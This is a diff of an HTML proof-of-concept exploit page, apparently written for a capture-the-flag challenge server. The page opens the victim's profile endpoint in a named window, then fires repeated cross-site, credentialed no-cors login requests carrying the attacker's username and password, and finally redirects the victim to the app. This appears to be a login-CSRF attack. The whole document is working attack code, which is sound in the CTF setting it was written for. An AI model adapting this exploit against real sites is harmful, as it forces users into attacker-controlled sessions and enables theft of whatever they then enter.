@@ -1,34 +1,45 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>poc</title>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>poc</title>
+</head>
+<body>
+loading...
 <script>
 const APP = 'http://chal.polyuctf.com:46605';
 const USER = 'cat4';
 const PASS = 'cat1234567';
 
-window.open(APP + '/api/profile', 'victim');
+try {
+  window.open(APP + '/api/profile', 'victim');
+} catch (e) {}
 
-setTimeout(() => {
-  fetch(APP + '/api/auth/login', {
+const creds = JSON.stringify({
+  username: USER,
+  password: PASS
+});
+
+function relogin() {
+  return fetch(APP + '/api/auth/login', {
     method: 'POST',
     mode: 'no-cors',
     credentials: 'include',
-    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-    body: JSON.stringify({ username: USER, password: PASS })
-  });
-}, 800);
+    headers: {
+      'Content-Type': 'text/plain;charset=UTF-8'
+    },
+    body: creds
+  }).catch(() => {});
+}
 
-setTimeout(() => {
-  fetch(APP + '/api/auth/login', {
-    method: 'POST',
-    mode: 'no-cors',
-    credentials: 'include',
-    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-    body: JSON.stringify({ username: USER, password: PASS })
-  });
-}, 1400);
+setTimeout(relogin, 700);
+setTimeout(relogin, 1200);
+setTimeout(relogin, 1700);
+setTimeout(relogin, 2300);
 
 setTimeout(() => {
   location = APP + '/';
-}, 2600);
+}, 3200);
 </script>
+</body>
+</html>
